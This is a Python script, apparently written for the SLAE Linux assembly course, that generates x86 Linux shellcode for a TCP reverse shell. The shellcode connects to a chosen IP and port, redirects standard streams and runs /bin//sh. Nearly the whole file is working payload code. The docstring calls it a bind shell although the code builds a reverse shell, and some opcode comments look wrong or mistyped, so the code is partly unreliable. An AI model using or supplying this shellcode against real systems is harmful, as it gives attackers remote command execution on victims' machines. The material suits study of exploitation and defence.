#!/usr/bin/env python3
"""
x86 Linux TCP Bindshell Generator
Handles portnumbers and destination IPs which have NULs in their hex representation
Usage: this_script.py <ip> <port>
Author: fbcsec
This code was written to fulfill the requirements of the SecurityTube Linux Assembly Expert course:
http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/index.html
Student ID: SLAE - 1187
"""
from sys import argv

from socket import inet_aton


def generate_ip_shellcode(ip_half):

    rv = ''

    if ip_half == '0000':
        rv = "\x66\x52"   # push word dx

        return rv

    if ip_half[0:2] == '00':
        rv = ("\x80\xc6" +  # add dh <ip half low bytes>
              bytearray.fromhex(ip_half[2:4]).decode('iso8859-1') +
              "\x66\x52" +  # push word dx
              "\x31\xd2")   # xor edx, edx
        return rv
    elif ip_half[2:4] == '00':
        rv = ("\x80\xc2" +  # add dl <ip half high bytes>
              bytearray.fromhex(ip_half[0:2]).decode('iso8859-1') +
              "\x66\x52" +  # push word dx
              "\x31\xd2")   # xor edx, edx
        return rv
    else:
        rv = ("\x66\x83" +  # push word <ip_half>
              bytearray.fromhex(ip_half).decode('iso-8859-1'))
        return rv

if len(argv) != 3:
    print('Usage: %s <ip_to_connect_to> <port>')
    raise SystemExit

ip = argv[1]
port = int(argv[2])

if port > 65535:
    print('ERROR: Port number cannot be greater than 65535.')
    raise SystemExit

if port == 0:
    print('ERROR: Port 0 is not usable.')
    raise SystemExit


hexip = "{0:#0{1}x}".format(int.from_bytes(inet_aton(ip), 'big'), 10)

#
HANDLE_IP_ADDRESS = None

if (hexip[2:4] == '00'
    or hexip[4:6] == '00'
    or hexip[6:8] == '00'
    or hexip[8:10] == '00'):
    HANDLE_IP_HIGH = generate_ip_shellcode(hexip[6:10])
    HANDLE_IP_LOW = generate_ip_shellcode(hexip[2:6])

    HANDLE_IP_ADDRESS = HANDLE_IP_HIGH + HANDLE_IP_LOW

else:
    HANDLE_IP_ADDRESS = "\x68" + bytearray.fromhex(hexip[2:]).decode('iso-8859-1')



# Port Number handling
# Zero padded port in hexadecimal
hexport = "{0:#0{1}x}".format(port, 6)

# If port is below 256
if hexport[2:4] == '00':
    HANDLE_PORT_NUMBER = ("\x80\xc6" +  # add dh <port number low bytes>
                          bytearray.fromhex(hexport[4:6]).decode('iso-8859-1') +
                          "\x66\x52" +  # push word dx
                          "\x31\xd2")  # xor edx, edx

elif hexport[4:6] == '00':
    HANDLE_PORT_NUMBER = ("\x80\xc2" +  # add dl <port number high bytes>
                          bytearray.fromhex(hexport[2:4]).decode('iso-8859-1') +
                          "\x66\x52" +  # push word dx
                          "\x31\xd2")  # xor edx, edx
else:
    HANDLE_PORT_NUMBER = ("\x66\x68" +  # push word <big endian port number>
                          bytearray.fromhex(hexport[2:4]).decode('iso-8859-1') +
                          bytearray.fromhex(hexport[4:6]).decode('iso-8859-1'))

shellcode = bytearray("\x31\xdb"                # xor ebx, ebx 
                      "\xf7\xe3"                # mul ebx
                      "\x50"                    # push eax
                      "\x43"                    # inc ebx
                      "\x53"                    # push ebx
                      "\x6a\x02"                # push 0x02
                      "\x89\xe1"                # mov ecx, exp
                      "\xb0\x66"                # mov al, 0x66
                      "\xcd\x80"                # int 0x80
                      "\x5f"                    # pop edi
                      "\x97"                    # xchg edi, eax
                      "\x93"                    # xchg ebx, eax
                      "\xb0\x66" +              # mov al, 0x66
                      HANDLE_IP_ADDRESS +
                      HANDLE_PORT_NUMBER +
                      "\x66\x53"                # push word bx
                      "\x43"                    # inc ebx
                      "\x89\xe1"                # mov ecx, esp
                      "\x6a\x10"                # push 0x10
                      "\x51"                    # push ecx
                      "\x57"                    # push edi
                      "\x89\xe1"                # mov ecx, esp
                      "\xcd\x80"                # int 0x80
                      "\x5b"                    # pop ebx
                      "\x89\xd1"                # mov ecx, edx
                      "\xb1\x02"                # mov cl, 0x02
                      "\x31\xc0"                # <label dup2_loop:> xor eax, eax
                      "\xb0\x3f"                # mov al, 0x3f
                      "\xcd\x80"                # int 0x80
                      "\x49"                    # dec ecx
                      "\x79\xf7"                # JNS short <dup2_loop>
                      "\x52"                    # push edx
                      "\x68\x2f\x2f\x73\x68"    # push 0x68732f2f
                      "\x68\x2f\x62\x69\x6e"    # push 0x6e69622f </bin//sh>
                      "\x89\xe3"                # mov ebx, esp
                      "\x52"                    # push eds
                      "\x89\xe2"                # mov edx, esp
                      "\x53"                    # push edx
                      "\x89\xe1"                # mov ecx, esp
                      "\xb0\x0b"                # mov al, 0x0b
                      "\xcd\x80",               # int 0x80
                      'iso-8859-1')

final_shellcode = ''

for i in shellcode:
    final_shellcode += '\\x'
    final_shellcode += '%02x' % (i & 0xff)

print("x86 Linux TCP Reverse Shell on port " + str(port))
print("Length: " + str(len(shellcode)) + "\n")
print("unsigned char shellcode[] = \"" + final_shellcode + "\";")
